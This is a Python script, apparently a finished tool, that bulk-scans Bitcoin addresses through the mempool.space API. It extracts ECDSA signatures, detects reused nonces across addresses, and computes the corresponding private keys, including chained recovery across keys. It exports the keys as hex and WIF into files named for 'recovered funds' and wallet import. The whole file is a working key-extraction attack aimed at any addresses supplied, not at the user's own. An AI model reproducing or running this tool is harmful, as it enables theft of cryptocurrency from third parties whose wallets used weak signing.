# ==============================================================================
# MERGED VPK BITCOIN SCANNER + RECOVERY TOOL (v3.0 - FINAL FIX)
# FEATURES: 
# 1. FIXED: Public Key Extraction (More Accurate Regex)
# 2. FIXED: OpenSSL 3.0 / RIPEMD160 Crash
# 3. FIXED: Auto-Recovery & File Input
# ==============================================================================

import requests, time, os, sys, math, signal
import re
import hashlib
import csv
from collections import defaultdict
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple

# ==============================================================================
# LIBRARY CHECKS & COMPATIBILITY FIXES
# ==============================================================================

# 1. Check for ECDSA
try:
    import ecdsa
    from ecdsa import SECP256k1 as curve
except ImportError:
    print("Error: 'ecdsa' library not found. Please run: pip install ecdsa")
    sys.exit(1)

# 2. Check for RIPEMD160 Support (Fix for OpenSSL 3.0 / Python 3.12+)
def calc_ripemd160(data: bytes) -> bytes:
    """Robust RIPEMD160 calculator. Falls back to pycryptodome if hashlib fails."""
    try:
        return hashlib.new('ripemd160', data).digest()
    except ValueError:
        try:
            from Crypto.Hash import RIPEMD160
            h = RIPEMD160.new(data=data)
            return h.digest()
        except ImportError:
            print("\n[CRITICAL ERROR] Your system's OpenSSL has disabled RIPEMD160.")
            print("You MUST install pycryptodome to run this script.")
            print("Command: pip install pycryptodome")
            sys.exit(1)

# ==============================================================================
# PART 1: SCANNER CONFIG & GLOBALS
# ==============================================================================

MEMPOOL_API_TXS = "https://mempool.space/api/address/{address}/txs?limit={limit}&offset={offset}"
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

BATCH_SIZE = 25
REQ_TIMEOUT = 20
MAX_RETRIES = 10

TOTAL_ADDRESSES = 0
SCANNED_ADDRESSES = 0
VULNERABLE_ADDRESSES = 0
VULN_COUNTS = defaultdict(int)
CURRENT_ADDRESS = ""
MAX_DISPLAYED_ADDRESSES = 10
EXIT_FLAG = False
REPORTS: List[Dict[str, Any]] = []
MAX_TRANSACTIONS = 0

GLOBAL_R_MAP: Dict[int, List[Dict[str, Any]]] = defaultdict(list)
SAVED_R_GROUPS: Dict[str, List[str]] = defaultdict(list)

SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "SafeBTCScanner-Mempool/3.0-fixed"})

# ==============================================================================
# PART 2: RECOVERY CONFIG
# ==============================================================================

# Reports will be saved here
OUTPUT_DIR = "reports"
OUTPUT_R_NONCE = os.path.join(OUTPUT_DIR, "rnonce.txt") # Human readable
OUTPUT_R_NON = os.path.join(OUTPUT_DIR, "rnon.txt")     # Parsing friendly

OUTPUT_CSV = "RECOVERED_FUNDS_FINAL.csv"
OUTPUT_WIF = "wallet_import_keys_final.txt"
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l" # Bech32 charset

# ==============================================================================
# SYSTEM FUNCTIONS
# ==============================================================================

def signal_handler(sig, frame):
    global EXIT_FLAG
    print("\n\n[!] Force Stop Detected! Finishing current step and starting recovery...")
    EXIT_FLAG = True

signal.signal(signal.SIGINT, signal_handler)

def clear():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass

def display_stats():
    clear()
    print("VPK Bitcoin RSZ Scanner (Legacy + SegWit + Native) v3.0")
    print(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80)
    print(f"Total Addresses: {TOTAL_ADDRESSES}")
    print(f"Scanned Addresses: {SCANNED_ADDRESSES}")
    percent = (VULNERABLE_ADDRESSES / SCANNED_ADDRESSES * 100) if SCANNED_ADDRESSES > 0 else 0.0
    print(f"Vulnerable Addresses: {VULNERABLE_ADDRESSES} ({percent:.1f}%)")
    print("\nVulnerabilities Found (counts):")
    print(f"🔴 Reused Nonce: {VULN_COUNTS['Reused Nonce']}")
    print("="*80)
    print(f"\nCurrently Scanning: {CURRENT_ADDRESS}")
    vuln_addrs = [r['address'] for r in REPORTS if r.get('vulnerabilities')]
    print("\nRecent Vulnerable Addresses:")
    for addr in vuln_addrs[-MAX_DISPLAYED_ADDRESSES:]:
        print(f" - {addr}")
    print("="*80)

def backoff_sleep(attempt: int):
    delay = min(2 ** attempt * 3, 120)
    print(f"[backoff] Sleeping {delay:.1f}s (attempt {attempt})")
    time.sleep(delay)

# ==============================================================================
# MEMPOOL & SCANNER LOGIC
# ==============================================================================

def get_total_transactions(address: str) -> Optional[int]:
    attempts = 0
    while attempts < MAX_RETRIES and not EXIT_FLAG:
        try:
            url = f"https://mempool.space/api/address/{address}"
            r = SESSION.get(url, timeout=REQ_TIMEOUT)
            if r.status_code == 200:
                data = r.json()
                return data.get("chain_stats", {}).get("tx_count", 0)
            elif r.status_code == 429:
                print(f"[rate limit] Total tx for {address}, retrying...")
                attempts += 1
                backoff_sleep(attempts)
            else:
                attempts += 1
                time.sleep(2)
        except Exception as e:
            print(f"[warn] get_total_transactions({address}) attempt {attempts+1}: {e}")
            attempts += 1
            time.sleep(2)
    return None

def fetch_transactions_batch(address: str, offset: int, limit: int) -> Optional[List[dict]]:
    attempts = 0
    while attempts < MAX_RETRIES and not EXIT_FLAG:
        try:
            url = MEMPOOL_API_TXS.format(address=address, offset=offset, limit=limit)
            r = SESSION.get(url, timeout=REQ_TIMEOUT)
            if r.status_code == 200:
                return r.json()
            elif r.status_code == 429:
                print(f"[rate limit] Batch offset {offset}, retrying...")
                attempts += 1
                backoff_sleep(attempts)
            elif r.status_code in (500, 502, 503, 504):
                print(f"[server err {r.status_code}] Batch offset {offset}, retrying...")
                attempts += 1
                backoff_sleep(attempts)
            else:
                attempts += 1
                time.sleep(2)
        except Exception as e:
            attempts += 1
            time.sleep(2)
    return None

def fetch_all_transactions(address: str, max_retries: int = 3) -> List[dict]:
    for retry in range(max_retries):
        total = get_total_transactions(address)
        if total is None:
            if retry < max_retries - 1:
                time.sleep(10)
                continue
            else:
                return []

        if total <= 0:
            return []

        print(f"\nAddress {address} has {total} total transactions")
        total_to_fetch = min(total, MAX_TRANSACTIONS) if MAX_TRANSACTIONS > 0 else total
        
        out: List[dict] = []
        offset = 0
        while offset < total_to_fetch and not EXIT_FLAG:
            remaining = total_to_fetch - offset
            size = min(BATCH_SIZE, remaining)
            print(f"Fetching batch {offset+1}-{offset+size} of {total_to_fetch}…")
            batch = fetch_transactions_batch(address, offset, size)
            if batch is None:
                time.sleep(5)
                continue
            if not batch:
                break
            out.extend(batch)
            offset += len(batch)
            if offset < total_to_fetch:
                time.sleep(1.5)

        if len(out) > 0:
            return out
        else:
            if retry < max_retries - 1:
                time.sleep(20)
                continue

    return []

# --- SIGHASH / preimage helpers ---
def varint(n: int) -> bytes:
    if n < 0xfd:
        return n.to_bytes(1, 'little')
    elif n <= 0xffff:
        return b'\xfd' + n.to_bytes(2, 'little')
    elif n <= 0xffffffff:
        return b'\xfe' + n.to_bytes(4, 'little')
    else:
        return b'\xff' + n.to_bytes(8, 'little')

def compute_legacy_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    try:
        from hashlib import sha256
        def dsha(b: bytes) -> bytes:
            return sha256(sha256(b).digest()).digest()

        version = int(tx.get("version", 1))
        locktime = int(tx.get("locktime", 0))
        ser = version.to_bytes(4, "little")

        vins = tx.get("vin", [])
        input_count = len(vins)
        ser += varint(input_count)
        for i, inp in enumerate(vins):
            prev_txid = inp.get("txid", "")
            if not prev_txid: return None
            prev_txid_bytes = bytes.fromhex(prev_txid)[::-1]
            vout_n = int(inp.get("vout", 0))
            ser += prev_txid_bytes
            ser += vout_n.to_bytes(4, "little")
            if i == vin_idx:
                prevout = inp.get("prevout", {})
                script_pubkey = prevout.get("scriptpubkey", "")
                if not script_pubkey: return None
                script_bytes = bytes.fromhex(script_pubkey)
                script_len = len(script_bytes)
                ser += varint(script_len) + script_bytes
            else:
                ser += b"\x00"
            sequence = int(inp.get("sequence", 0xffffffff))
            ser += sequence.to_bytes(4, "little")

        vouts = tx.get("vout", [])
        output_count = len(vouts)
        ser += varint(output_count)
        for out in vouts:
            value = int(out.get("value", 0))
            ser += value.to_bytes(8, "little")
            scriptpubkey = out.get("scriptpubkey", "")
            script_bytes = bytes.fromhex(scriptpubkey)
            script_len = len(script_bytes)
            ser += varint(script_len) + script_bytes

        ser += locktime.to_bytes(4, "little")
        ser += sighash_flag.to_bytes(4, "little")
        return int.from_bytes(dsha(ser), "big")
    except Exception as e:
        return None

def compute_bip143_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    try:
        from hashlib import sha256
        def dsha(b: bytes) -> bytes:
            return sha256(sha256(b).digest()).digest()

        vins = tx.get("vin", [])
        txin = vins[vin_idx]
        prevout = txin.get("prevout", {})
        input_type = prevout.get("scriptpubkey_type", prevout.get("type", "unknown"))

        if input_type not in ["v0_p2wpkh", "p2wpkh", "p2sh-p2wpkh", "scripthash", "witness_v0_keyhash"]:
            return None

        version = int(tx.get("version", 2))
        locktime = int(tx.get("locktime", 0))

        prevouts_ser = b""
        for inp in vins:
            prev_txid_bytes = bytes.fromhex(inp.get("txid", ""))[::-1]
            vout_n = int(inp.get("vout", 0))
            prevouts_ser += prev_txid_bytes + vout_n.to_bytes(4, "little")
        hashPrevouts = dsha(prevouts_ser)

        sequences_ser = b""
        for inp in vins:
            sequence = int(inp.get("sequence", 0xffffffff))
            sequences_ser += sequence.to_bytes(4, "little")
        hashSequence = dsha(sequences_ser)

        outputs_ser = b""
        for out in tx.get("vout", []):
            value = int(out.get("value", 0))
            outputs_ser += value.to_bytes(8, "little")
            scriptpubkey = out.get("scriptpubkey", "")
            script_bytes = bytes.fromhex(scriptpubkey)
            script_len = len(script_bytes)
            outputs_ser += varint(script_len) + script_bytes
        hashOutputs = dsha(outputs_ser)

        outpoint = bytes.fromhex(txin.get("txid", ""))[::-1] + int(txin.get("vout", 0)).to_bytes(4, "little")

        hash160 = b""
        spk_hex = prevout.get("scriptpubkey", "")
        spk_bytes = bytes.fromhex(spk_hex)

        if len(spk_bytes) == 22 and spk_bytes[:2] == b'\x00\x14':
            hash160 = spk_bytes[2:]
        elif len(spk_bytes) == 23 and spk_bytes[:2] == b'\xa9\x14':
             scriptsig = txin.get("scriptsig", "")
             if isinstance(scriptsig, dict): scriptsig = scriptsig.get("hex", "")
             
             if len(scriptsig) == 46:
                 redeem_hex = scriptsig[2:]
                 redeem_bytes = bytes.fromhex(redeem_hex)
                 if len(redeem_bytes) == 22 and redeem_bytes[:2] == b'\x00\x14':
                     hash160 = redeem_bytes[2:]
             
        if not hash160:
             witness = txin.get("witness", [])
             if len(witness) == 2:
                 pubkey = witness[1]
                 pk_bytes = bytes.fromhex(pubkey)
                 # FIXED: Use custom calc_ripemd160
                 r = calc_ripemd160(sha256(pk_bytes).digest())
                 hash160 = r

        if not hash160: return None

        script_code_body = b"\x76\xa9\x14" + hash160 + b"\x88\xac"
        scriptCode = varint(len(script_code_body)) + script_code_body

        value = int(prevout.get("value", 0)).to_bytes(8, "little")
        sequence = int(txin.get("sequence", 0xffffffff)).to_bytes(4, "little")

        preimage = (
            version.to_bytes(4, "little") + hashPrevouts + hashSequence +
            outpoint + scriptCode + value + sequence + hashOutputs +
            locktime.to_bytes(4, "little") + sighash_flag.to_bytes(4, "little")
        )
        return int.from_bytes(dsha(preimage), "big")
    except Exception as e:
        return None

def compute_sighash_z(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    try:
        if sighash_flag != 1:
            return None
        vins = tx.get("vin", [])
        if vin_idx >= len(vins): return None
        txin = vins[vin_idx]
        prevout = txin.get("prevout", {})
        input_type = prevout.get("scriptpubkey_type", prevout.get("type", "unknown"))
        
        if input_type in ["v0_p2wpkh", "p2wpkh", "p2sh-p2wpkh", "witness_v0_keyhash"]:
            return compute_bip143_sighash(tx, vin_idx, sighash_flag)
        else:
            return compute_legacy_sighash(tx, vin_idx, sighash_flag)
    except Exception as e:
        return None

def parse_der_sig_from_hex(sig_hex: str) -> Optional[Tuple[int, int, int]]:
    try:
        i = sig_hex.find("30")
        if i == -1: return None
        i0 = i + 2
        _seq_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        if sig_hex[i0:i0+2] != "02": return None
        i0 += 2
        r_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        r_hex = sig_hex[i0:i0 + 2*r_len]; i0 += 2*r_len
        if sig_hex[i0:i0+2] != "02": return None
        i0 += 2
        s_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        s_hex = sig_hex[i0:i0 + 2*s_len]; i0 += 2*s_len
        sighash_hex = sig_hex[i0:i0+2]
        sighash_flag = int(sighash_hex, 16) if sighash_hex else 1
        r = int(r_hex, 16); s = int(s_hex, 16)
        return (r, s, sighash_flag)
    except Exception:
        return None

# --- IMPROVED PUBLIC KEY EXTRACTION ---
def extract_pubkey_from_scriptsig(script_hex: str) -> Optional[str]:
    """
    Extracts a valid compressed (33 bytes) or uncompressed (65 bytes) public key.
    Prioritizes full keys found in the script.
    """
    if not script_hex: return None
    hexstr = script_hex.lower()
    
    # 1. Uncompressed Keys (04 + 64 bytes X + 64 bytes Y = 130 hex chars)
    # Checks specifically for '04' followed by 128 hex digits
    uncompressed = re.findall(r'04[0-9a-f]{128}', hexstr)
    
    # 2. Compressed Keys (02 or 03 + 32 bytes X = 66 hex chars)
    # Checks specifically for '02' or '03' followed by 64 hex digits
    compressed = re.findall(r'(?:02|03)[0-9a-f]{64}', hexstr)
    
    # Priority: In legacy P2PKH, the pubkey is usually the LAST pushdata.
    # We combine candidates and pick the one that appears LAST in the string
    # because the structure is usually: [Signature] [PublicKey]
    
    candidates = []
    
    for pk in uncompressed:
        candidates.append(pk)
        
    for pk in compressed:
        candidates.append(pk)
        
    if not candidates:
        return None
        
    # If multiple candidates, we find which one is physically last in the hex string
    best_candidate = None
    last_index = -1
    
    for cand in candidates:
        idx = hexstr.rfind(cand)
        if idx > last_index:
            last_index = idx
            best_candidate = cand
            
    return best_candidate

def extract_signatures(transactions: List[dict]) -> List[Dict[str, Any]]:
    sigs = []
    for tx in transactions:
        try:
            txid = tx.get("txid", "")
            vins = tx.get("vin", [])
            for vin_idx, txin in enumerate(vins):
                parsed = None
                pubkey = None
                sighash_flag = 1
                witness = txin.get("witness", [])
                
                # STRATEGY 1: Check Witness (SegWit) - Most Reliable for newer txs
                if witness and len(witness) >= 2:
                    sig_hex = witness[0]
                    # The second item in witness for P2WPKH is ALWAYS the PubKey
                    possible_pub = witness[1]
                    if len(possible_pub) == 66 or len(possible_pub) == 130:
                        pubkey = possible_pub
                    parsed = parse_der_sig_from_hex(sig_hex)
                
                # STRATEGY 2: Check ScriptSig (Legacy) if no witness success
                if not pubkey or not parsed:
                    scriptsig = txin.get("scriptsig", {})
                    # Ensure we get the HEX string, not ASM
                    script_hex = scriptsig.get("hex", "") if isinstance(scriptsig, dict) else txin.get("scriptsig", "")
                    
                    if script_hex:
                        if not pubkey:
                            pubkey = extract_pubkey_from_scriptsig(script_hex)
                        if not parsed:
                            parsed = parse_der_sig_from_hex(script_hex)
                        
                if not parsed or not pubkey: continue
                
                r, s, sighash_flag = parsed
                z_val = compute_sighash_z(tx, vin_idx, sighash_flag)
                
                if z_val is not None:
                    sigs.append({
                        "txid": txid, "vin": vin_idx, "r": r, "s": s,
                        "sighash": sighash_flag, "pubkey": pubkey, "z_original": z_val
                    })
        except Exception as e:
            continue
    return sigs

def check_reused_nonce_global(this_address: str, signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    results = []
    seen_r_local = set()
    for s in signatures:
        r_val = s["r"]
        if r_val in seen_r_local: continue
        seen_r_local.add(r_val)
        group = GLOBAL_R_MAP.get(r_val, [])
        if len(group) >= 2:
            occ = []
            seen = set()
            for item in group:
                txid = item.get("txid", "")
                pk = item.get("pubkey")
                key = (txid, pk)
                if key in seen: continue
                seen.add(key)
                occ.append({"txid": txid, "pubkey": pk})
            if len(occ) >= 2:
                results.append({
                    "type": "Reused Nonce", "r": hex(r_val), "occurrences": occ,
                    "risk": "Multiple signatures share identical r.", "action": "Rotate keys."
                })
    return results

def save_rnonce(vulns: List[Dict[str, Any]], address: str):
    if not vulns: return
    
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    # Append to human readable file
    for v in vulns:
        if v["type"] != "Reused Nonce": continue
        r_hex = v["r"][2:] if isinstance(v.get("r"), str) and v["r"].startswith("0x") else str(hex(int(v.get("r")))[2:])
        
        # Track globally
        for occ in v["occurrences"]:
            txid = occ.get("txid") or "N/A"
            pk = occ.get("pubkey") or "N/A"
            key = f"{txid}|{pk}"
            if key not in SAVED_R_GROUPS[r_hex]:
                SAVED_R_GROUPS[r_hex].append(key)

    # Rewrite files with accumulated global data
    with open(OUTPUT_R_NONCE, "w", encoding="utf-8") as f:
        for r_hex, occ_list in SAVED_R_GROUPS.items():
            f.write("=" * 80 + "\n")
            f.write("Reused Nonce Group\n")
            f.write("=" * 80 + "\n")
            f.write(f"r: {r_hex}\n")
            f.write("Occurrences:\n")
            for key in occ_list:
                txid, pk = key.split("|")
                f.write(f" - txid={txid} pubkey={pk}\n")
            f.write("\n")
    print(f"[updated] {OUTPUT_R_NONCE}")

    # Write parser-friendly file
    with open(OUTPUT_R_NON, "w", encoding="utf-8") as f:
        for r_hex, _ in list(SAVED_R_GROUPS.items()):
            r_int = int(r_hex, 16)
            group = GLOBAL_R_MAP.get(r_int, [])
            if len(group) < 2: continue
            f.write("=" * 80 + "\n")
            f.write("Reused Nonce Group\n")
            f.write("=" * 80 + "\n")
            f.write(f"r: {r_hex}\n")
            f.write("Occurrences:\n")
            seen = set()
            for item in group:
                txid = item.get("txid", "N/A")
                s_val = item.get("s", "N/A")
                if isinstance(s_val, int): s_hex = hex(s_val)[2:]
                else: s_hex = str(s_val)
                z_val = item.get("z_original")
                z_hex = hex(z_val)[2:] if z_val is not None else "N/A"
                pk = item.get("pubkey", "N/A")
                key = (txid, pk)
                if key in seen: continue
                seen.add(key)
                f.write(f" - txid={txid} s={s_hex} z={z_hex} pubkey={pk}\n")
            f.write("\n")
    print(f"[updated] {OUTPUT_R_NON}")

def analyze_address(address: str) -> Optional[Dict[str, Any]]:
    global SCANNED_ADDRESSES, VULNERABLE_ADDRESSES, CURRENT_ADDRESS
    CURRENT_ADDRESS = address
    SCANNED_ADDRESSES += 1
    display_stats()
    report: Dict[str, Any] = {
        "address": address, "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "transaction_count": 0, "signature_count": 0, "vulnerabilities": [],
    }
    txs = fetch_all_transactions(address)
    report["transaction_count"] = len(txs)
    sigs = extract_signatures(txs)
    report["signature_count"] = len(sigs)
    print(f"Extracted {len(sigs)} signatures from {len(txs)} txs")
    for g in sigs:
        GLOBAL_R_MAP[g["r"]].append({
            "address": address, "txid": g.get("txid", ""), "pubkey": g.get("pubkey"),
            "s": g["s"], "z_original": g["z_original"]
        })
    vulns: List[Dict[str, Any]] = []
    reused = check_reused_nonce_global(address, sigs)
    if reused:
        vulns.extend(reused)
        VULN_COUNTS["Reused Nonce"] += len(reused)
        print(f"Found {len(reused)} reused nonce groups for {address}")
    if vulns:
        VULNERABLE_ADDRESSES += 1
        report["vulnerabilities"] = vulns
    REPORTS.append(report)
    save_rnonce(vulns, address)
    print(f"[delay] 3s pause after {address}")
    time.sleep(3)
    return report

def get_input_file() -> str:
    while True:
        # Prompt for file (Fix for drag and drop quotes)
        file_name = input("Enter path to BTC addresses file (one per line): ").strip().replace('"', '').replace("'", "")
        if os.path.isfile(file_name): return file_name
        print(f"File not found: {file_name}. Try again.")

def get_transaction_limit() -> int:
    while True:
        s = input("Max transactions per address (0 = no limit): ").strip()
        try:
            v = int(s)
            if v >= 0: return v
        except ValueError: pass
        print("Please enter a valid non-negative integer.")

# ==============================================================================
# RECOVERY FUNCTIONS (With RIPEMD Fix)
# ==============================================================================

def bech32_polymod(values):
    generator = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for value in values:
        top = chk >> 25
        chk = (chk & 0x1ffffff) << 5 ^ value
        for i in range(5):
            chk ^= generator[i] if ((top >> i) & 1) else 0
    return chk

def bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def bech32_create_checksum(hrp, data):
    values = bech32_hrp_expand(hrp) + data
    polymod = bech32_polymod(values + [0, 0, 0, 0, 0, 0]) ^ 1
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]

def bech32_encode(hrp, data):
    combined = data + bech32_create_checksum(hrp, data)
    return hrp + '1' + ''.join([CHARSET[d] for d in combined])

def convertbits(data, frombits, tobits, pad=True):
    acc = 0
    bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or (value >> frombits): return None
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits: ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv): return None
    return ret

def base58_encode(b):
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    x = int.from_bytes(b, "big")
    out = []
    while x > 0:
        x, rem = divmod(x, 58)
        out.append(alphabet[rem])
    for byte in b:
        if byte == 0: out.append("1")
        else: break
    return "".join(reversed(out))

def priv_to_wif(priv_hex, compressed=True):
    priv = bytes.fromhex("80" + priv_hex)
    if compressed: priv += b"\x01"
    chk = hashlib.sha256(hashlib.sha256(priv).digest()).digest()[:4]
    return base58_encode(priv + chk)

def pub_to_addresses(pub_hex):
    pub_bytes = bytes.fromhex(pub_hex)
    sha = hashlib.sha256(pub_bytes).digest()
    
    # FIXED: Use custom calc_ripemd160
    ripe = calc_ripemd160(sha)
    
    # 1. P2PKH (Legacy)
    p2pkh = base58_encode(b"\x00" + ripe + hashlib.sha256(hashlib.sha256(b"\x00" + ripe).digest()).digest()[:4])
    
    # 2. P2WPKH (Native SegWit - Bech32)
    witness_prog = convertbits(ripe, 8, 5)
    p2wpkh = bech32_encode("bc", [0] + witness_prog)
    
    # 3. P2SH-P2WPKH (Nested SegWit)
    redeem = b"\x00\x14" + ripe
    sha_r = hashlib.sha256(redeem).digest()
    ripe_r = calc_ripemd160(sha_r) # FIXED
    p2sh = base58_encode(b"\x05" + ripe_r + hashlib.sha256(hashlib.sha256(b"\x05" + ripe_r).digest()).digest()[:4])
    
    return p2pkh, p2wpkh, p2sh

def modinv(a, m=N):
    return pow(a, -1, m)

def verify_key(pub_hex, priv_int):
    if priv_int <= 0 or priv_int >= N: return False
    try:
        sk = ecdsa.SigningKey.from_secret_exponent(priv_int, curve=curve)
        vk = sk.verifying_key
        pt = vk.pubkey.point
        
        if pub_hex.startswith('04') and len(pub_hex) == 130:
            x_bytes = pt.x().to_bytes(32, 'big')
            y_bytes = pt.y().to_bytes(32, 'big')
            generated_pub = (b'\x04' + x_bytes + y_bytes).hex()
        else:
            x_bytes = pt.x().to_bytes(32, 'big')
            prefix = b'\x02' if pt.y() % 2 == 0 else b'\x03'
            generated_pub = (prefix + x_bytes).hex()
            
        return generated_pub == pub_hex.lower()
    except:
        return False

def attempt_bootstrap(r, s1, z1, s2, z2):
    candidates = []
    s1_opts = [s1, N - s1]
    s2_opts = [s2, N - s2]
    
    for _s1 in s1_opts:
        for _s2 in s2_opts:
            if _s1 == _s2: continue
            try:
                k = ((z1 - z2) * modinv(_s1 - _s2, N)) % N
                d = ((_s1 * k - z1) * modinv(r, N)) % N
                candidates.append(d)
            except: pass
    return candidates

def attempt_chain(r, s_known, z_known, d_known, s_target, z_target):
    candidates = []
    s_known_opts = [s_known, N - s_known]
    s_target_opts = [s_target, N - s_target]
    
    for _sk in s_known_opts:
        try:
            k = ((z_known + r * d_known) * modinv(_sk, N)) % N
            for _st in s_target_opts:
                d2 = ((_st * k - z_target) * modinv(r, N)) % N
                candidates.append(d2)
        except: pass
    return candidates

# ==============================================================================
# MAIN EXECUTION
# ==============================================================================

def start_recovery():
    print("[-] Reading and Parsing File...")
    try:
        with open(OUTPUT_R_NON, "r", encoding="utf-8", errors="ignore") as f:
            raw_data = f.read()
    except FileNotFoundError:
        print(f"[!] File '{OUTPUT_R_NON}' not found! No vulnerable addresses found yet.")
        return

    parsed_groups = []
    raw_blocks = re.split(r"={10,}", raw_data)

    for block in raw_blocks:
        r_match = re.search(r"r:\s*([a-f0-9]{1,64})", block, re.IGNORECASE)
        if not r_match: continue
        r_hex = r_match.group(1).lower()
        
        txs = re.findall(r"s=([a-f0-9]+)[\s\S]*?z=([a-f0-9]+)[\s\S]*?pubkey=([a-f0-9]+)", block, re.IGNORECASE)
        
        valid_txs = []
        for s, z, pub in txs:
            if z != "N/A" and pub != "N/A": 
                valid_txs.append((s, z, pub))

        if len(valid_txs) >= 2:
            parsed_groups.append({"r": int(r_hex, 16), "txs": valid_txs})

    print(f"[-] Loaded {len(parsed_groups)} groups for analysis.")

    recovered_db = {}
    found_something = True
    iteration = 0

    print("\n[+] STARTING RECOVERY ENGINE...")

    while found_something:
        iteration += 1
        found_something = False
        print(f"--- Iteration {iteration} (Keys Found: {len(recovered_db)}) ---")
        
        for group in parsed_groups:
            r = group['r']
            txs = group['txs']
            
            pub_map = {}
            for s, z, pub in txs:
                pub = pub.lower()
                if pub not in pub_map: pub_map[pub] = []
                pub_map[pub].append((int(s, 16), int(z, 16)))
                
            # Bootstrap
            for pub, entries in pub_map.items():
                if pub in recovered_db: continue
                if len(entries) >= 2:
                    s1, z1 = entries[0]
                    s2, z2 = entries[1]
                    candidates = attempt_bootstrap(r, s1, z1, s2, z2)
                    for d in candidates:
                        if verify_key(pub, d):
                            recovered_db[pub] = d
                            print(f"   [BOOTSTRAP SUCCESS] Key found: {pub[:16]}...")
                            found_something = True
                            break
            
            # Chain
            master_params = None
            for s, z, pub in txs:
                pub = pub.lower()
                if pub in recovered_db:
                    master_params = (int(s, 16), int(z, 16), recovered_db[pub])
                    break
            
            if master_params:
                s_known, z_known, d_known = master_params
                for s_target_hex, z_target_hex, pub_target in txs:
                    pub_target = pub_target.lower()
                    if pub_target in recovered_db: continue
                    s_t = int(s_target_hex, 16)
                    z_t = int(z_target_hex, 16)
                    candidates = attempt_chain(r, s_known, z_known, d_known, s_t, z_t)
                    for d in candidates:
                        if verify_key(pub_target, d):
                            recovered_db[pub_target] = d
                            print(f"   [CHAINED] Unlocked: {pub_target[:16]}...")
                            found_something = True
                            break

    print(f"\n[+] SCAN FINISHED. Total Private Keys: {len(recovered_db)}")

    if len(recovered_db) > 0:
        with open(OUTPUT_CSV, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["Public Key", "Private Key Hex", "WIF", "Type", "P2PKH", "P2WPKH", "P2SH"])
            wif_list = []
            for pub, priv_int in recovered_db.items():
                priv_hex = hex(priv_int)[2:].zfill(64)
                
                if pub.startswith('04') and len(pub) == 130:
                    is_compressed = False
                    key_type = "Uncompressed"
                else:
                    is_compressed = True
                    key_type = "Compressed"
                
                wif = priv_to_wif(priv_hex, compressed=is_compressed)
                a1, a2, a3 = pub_to_addresses(pub)
                w.writerow([pub, priv_hex, wif, key_type, a1, a2, a3])
                wif_list.append(wif)
                
        with open(OUTPUT_WIF, "w") as f:
            f.write("\n".join(wif_list))
        print(f"Data saved to {OUTPUT_CSV} and {OUTPUT_WIF}")
    else:
        print("No keys found.")

def main():
    global TOTAL_ADDRESSES, MAX_TRANSACTIONS
    try:
        addr_file = get_input_file()
        MAX_TRANSACTIONS = get_transaction_limit()
        
        with open(addr_file, "r", encoding="utf-8") as f:
            addresses = [ln.strip() for ln in f if ln.strip()]
        TOTAL_ADDRESSES = len(addresses)

        print("\nAll transaction data will be fetched for reused nonce checks.")
        print("[*] NOTE: Press Ctrl+C at any time to stop scanning and start recovery immediately.")

        for addr in addresses:
            if EXIT_FLAG:
                print(f"\n[!] Force stop signal received. Stopping scan at address: {addr}")
                break
            analyze_address(addr)

        print("\n" + "="*80)
        if EXIT_FLAG:
            print("SCAN INTERRUPTED BY USER. PROCESSING COLLECTED DATA...")
        else:
            print("SCAN COMPLETED. PROCESSING DATA...")
        
        # AUTOMATICALLY TRIGGER RECOVERY
        print("\n" + "="*80)
        print("STARTING RECOVERY MODULE (On collected data)")
        print("="*80 + "\n")
        
        start_recovery()

    except KeyboardInterrupt:
        print("\n\n[!] Script interrupted! Starting recovery on available data...")
        start_recovery()
        sys.exit(0)

if __name__ == "__main__":
    main()